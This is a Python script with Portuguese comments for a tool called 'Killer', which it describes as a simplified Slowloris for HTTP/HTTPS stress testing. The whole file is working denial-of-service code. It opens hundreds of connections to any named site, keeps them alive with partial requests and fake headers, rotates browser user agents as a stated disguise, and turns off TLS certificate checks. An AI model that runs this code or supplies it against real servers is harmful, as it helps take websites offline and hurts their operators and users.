#print("Hello Word")

#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import ssl  # Módulo para suporte a HTTPS

# Arte visual estilo Banco de Dados
KILLER_BANNER = """
###########################################
#                                         #
#         SISTEMA DE BANCO DE DADOS       #
#         [ MODULO: KILLER V1.1 ]          #
#         STATUS: SUPORTE ATIVO.          #
#                                         #
###########################################

(o killer é o slowloris facilitado e brasileiro
feito para testes de estresses em HTTP/HTTPS)"""

def print_banner():
    print(KILLER_BANNER)

# Configuração dos comandos
parser = argparse.ArgumentParser(
    description="Killer - Ferramenta de teste de estresse de servidores Web e sites"
)
parser.add_argument("alvo", nargs="?", help="Endereço do site (ex: google.com)")
parser.add_argument(
    "-p", "--porta", default=443, help="Porta do servidor (80 para HTTP e 443 para HTTPS)", type=int
)
parser.add_argument(
    "-t", "--threads",
    dest="sockets",
    default=300,
    help="Número de conexões simultâneas",
    type=int,
)
parser.add_argument(
    "-v", "--detalhes",
    dest="verbose",
    action="store_true",
    help="Mostra informações técnicas detalhadas",
)
parser.add_argument(
    "-ua", "--disfarce",
    dest="randuseragent",
    action="store_true",
    help="Usa navegadores aleatórios para cada pedido",
)
parser.add_argument(
    "-s", "--espera",
    dest="sleeptime",
    default=15,
    type=int,
    help="Tempo de espera entre cada sinal enviado",
)

args = parser.parse_args()

if len(sys.argv) <= 1:
    print_banner()
    parser.print_help()
    sys.exit(1)

if not args.alvo:
    print("Erro: Você precisa especificar um Alvo!")
    sys.exit(1)

# Configuração do LOG
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

# Funções injetadas no Socket
def enviar_linha(self, linha):
    linha = f"{linha}\\r\\n"
    self.send(linha.encode("utf-8"))

def enviar_cabecalho(self, nome, valor):
    self.enviar_linha(f"{nome}: {valor}")

setattr(socket.socket, "enviar_linha", enviar_linha)
setattr(socket.socket, "enviar_cabecalho", enviar_cabecalho)

lista_de_conexoes = []
navegadores = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def iniciar_conexao(ip):
    # Criação do socket base
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)

    # Se a porta for 443 (HTTPS), envolvemos o socket com SSL
    if args.porta == 443:
        contexto = ssl.create_default_context()
        contexto.check_hostname = False
        contexto.verify_mode = ssl.CERT_NONE
        sock = contexto.wrap_socket(sock, server_hostname=ip)

    try:
        sock.connect((ip, args.porta))
        sock.enviar_linha(f"GET /?{random.randint(0, 5000)} HTTP/1.1")

        ua = navegadores[0]
        if args.randuseragent:
            ua = random.choice(navegadores)

        sock.enviar_cabecalho("User-Agent", ua)
        sock.enviar_cabecalho("Accept-language", "pt-BR,pt,q=0.9")
        return sock
    except Exception as e:
        logging.debug(f"Falha na conexão: {e}")
        return None

def ciclo_killer():
    logging.info("Enviando sinais para manter %s conexões vivas...", len(lista_de_conexoes))

    for s in list(lista_de_conexoes):
        try:
            # Envia um cabeçalho falso para manter o timeout do servidor rodando
            s.enviar_cabecalho("X-a", random.randint(1, 5000))
        except socket.error:
            lista_de_conexoes.remove(s)

    falta = args.sockets - len(lista_de_conexoes)
    if falta > 0:
        logging.info("Repondo %s conexões perdidas...", falta)
        for _ in range(falta):
            s = iniciar_conexao(args.alvo)
            if s:
                lista_de_conexoes.append(s)

def main():
    print_banner()
    alvo = args.alvo
    quantidade = args.sockets
    logging.info("Iniciando KILLER contra %s na porta %s.", alvo, args.porta)

    for i in range(quantidade):
        logging.debug("Criando conexão número %s", i+1)
        s = iniciar_conexao(alvo)
        if s:
            lista_de_conexoes.append(s)

    while True:
        try:
            ciclo_killer()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Parando o Killer. Teste finalizado.")
            break
        except Exception as e:
            logging.debug("Erro durante o ciclo: %s", e)

        time.sleep(args.sleeptime)

if __name__ == "__main__":
    main()
  
